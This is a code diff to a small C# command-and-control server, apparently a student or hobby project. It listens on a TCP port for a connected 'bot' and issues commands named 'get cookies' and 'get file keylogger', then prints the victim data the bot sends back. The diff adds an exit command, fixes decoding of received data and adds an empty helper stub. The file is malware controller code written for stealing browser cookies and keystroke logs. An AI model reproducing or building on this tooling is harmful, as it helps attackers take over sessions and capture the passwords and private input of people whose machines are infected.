@@ -6,6 +6,8 @@ using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 using System.Runtime.Remoting.Channels;
+using System.IO;
+using System.Runtime.InteropServices.ComTypes;
 
 namespace Control
 {
@@ -16,14 +18,15 @@ namespace Control
         private const int BUFFER_SIZE = 1024;
         private const int PORT_NUMBER = 9999;
         static ASCIIEncoding encoding = new ASCIIEncoding();
-    
 
+      
         static void Main(string[] args)
         {
             try
             {
 
                 IPAddress address = IPAddress.Parse("192.168.1.100");
+
                 TcpListener listener = new TcpListener(address, PORT_NUMBER);
 
                 // 1. listen
@@ -34,27 +37,19 @@ namespace Control
 
 
                 Socket socket = listener.AcceptSocket();
+
                 Console.WriteLine("Connection received from " + socket.RemoteEndPoint);
-                while(true)
+
+
+                while (true)
                 {
                     Console.WriteLine(" Command & Control Center");
                     Console.Write("Enter your command: ");
                     string command = Console.ReadLine();
+
                     handleCommand(command, socket);
 
-                }    
-                // 2. receive
-                //byte[] data = new byte[BUFFER_SIZE];
-                //socket.Receive(data);
-
-                //string str = encoding.GetString(data);
-
-                //// 3. send
-                //socket.Send(encoding.GetBytes("Hello " + str));
-
-                // 4. close
-                //socket.Close();
-                //listener.Stop();
+                }
 
             }
             catch (Exception ex)
@@ -62,6 +57,7 @@ namespace Control
                 Console.WriteLine("Error: " + ex);
             }
         }
+
 
         public static void handleCommand(string command, Socket socket)
         {
@@ -71,22 +67,41 @@ namespace Control
                 Console.Clear();
 
             } 
+            else if(command == "exit")
+            {
+                socket.Send(encoding.GetBytes("exit"));
+                Console.WriteLine("Sending exit command...");
+
+                byte[] data = new byte[BUFFER_SIZE];
+                socket.Receive(data);
+                Console.WriteLine("Client: " + encoding.GetString(data));
+            }    
             else if(command== "get cookies")
             {
                 socket.Send(encoding.GetBytes("cookies"));
                 Console.WriteLine("Sending request get cookies...");
+
                 byte[] data = new byte[BUFFER_SIZE];
                 socket.Receive(data);
-                Console.WriteLine("Client: " + data);
+                Console.WriteLine("Client: " + encoding.GetString(data));
+
+                //byte[] buffer = new byte[1024];
+                //int bytesRead = stream.Read(buffer, 0, buffer.Length);
+                //string message = Encoding.ASCII.GetString(buffer, 0, bytesRead);
+                //Console.WriteLine("Client: " + message);
 
             }
             else if (command == "get file keylogger")
             {
+                
+
                 socket.Send(encoding.GetBytes("keylogger"));
                 Console.WriteLine("Sending request get keylogger...");
                 byte[] data = new byte[BUFFER_SIZE];
                 socket.Receive(data);
-                Console.WriteLine("Client: " + data);
+
+
+                Console.WriteLine("Client: " + encoding.GetString(data));
             }
             else if(command == "help")
             {
@@ -95,6 +110,10 @@ namespace Control
                 Console.WriteLine("get file keylogger                  --> Get File From Bot");
             }
                
-        }    
+        }
+        public static void sendMessageSocket(string message)
+        {
+
+        }
     }
 }
